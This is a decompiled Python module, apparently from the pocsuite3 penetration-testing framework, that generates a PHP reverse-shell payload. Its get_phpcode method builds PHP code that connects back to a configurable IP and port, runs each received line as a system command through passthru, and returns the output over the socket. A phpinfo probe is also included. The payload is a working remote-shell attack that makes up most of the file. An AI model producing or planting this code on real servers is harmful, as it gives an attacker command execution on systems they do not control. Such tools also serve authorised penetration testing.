# uncompyle6 version 3.6.7
# Python bytecode 3.7 (3394)
# Decompiled from: Python 3.8.2 (tags/v3.8.2:7b3ab59, Feb 25 2020, 23:03:10) [MSC v.1916 64 bit (AMD64)]
# Embedded file name: /Users/boyhack/programs/pocsuite3/pocsuite3/shellcodes/php.py
# Compiled at: 2019-03-15 03:35:12
# Size of source mod 2**32: 2235 bytes
from .base import ShellCode

class PhpShellCode(ShellCode):
    """PhpShellCode"""

    def __init__(self, connect_back_ip='localhost', connect_back_port=5555, prefix='<?php', suffix='?>'):
        ShellCode.__init__(self, connect_back_ip=connect_back_ip, connect_back_port=connect_back_port,
          prefix=prefix,
          suffix=suffix)

    def get_phpinfo(self):
        """ Function to get phpinfo """
        phpcode = '<?php phpinfo(); ?>'
        return phpcode

    def get_phpcode(self):
        """ Function to get php shellcode """
        if not (self.connect_back_ip and self.connect_back_port):
            print('Settings for connect back listener must be defined')
            return False
        phpcode = '\n        $address="{{LOCALHOST}}";\n        $port={{LOCALPORT}};\n        $buff_size=2048;\n        $timeout=120;\n        $sock=fsockopen($address,$port) or die("Cannot create a socket");\n        while ($read=fgets($sock,$buff_size)) {\n            $out="";\n            if ($read) {\n                if (strcmp($read,"quit")===0 || strcmp($read,"q")===0) {\n                    break;\n                }\n                ob_start();\n                passthru($read);\n                $out=ob_get_contents();\n                ob_end_clean();\n            }\n            $length=strlen($out);\n            while (1) {\n                $sent=fwrite($sock,$out,$length);\n                if ($sent===false) {\n                    break;\n                }\n                if ($sent<$length) {\n                    $st=substr($st,$sent);\n                    $length-=$sent;\n                } else {\n                    break;\n                }\n            }\n        }\n        fclose($sock);\n        '
        phpcode = self.format_shellcode(phpcode)
        phpcode = '{prefix}{code}{suffix}'.format(prefix=(self.prefix), code=phpcode, suffix=(self.suffix))
        return phpcode

    def get_shellcode(self, inline=False):
        shell = self.get_phpcode()
        if inline:
            shell = self.make_inline(shell)
        return shell


if __name__ == '__main__':
    p = PhpShellCode()
    print(p.get_shellcode())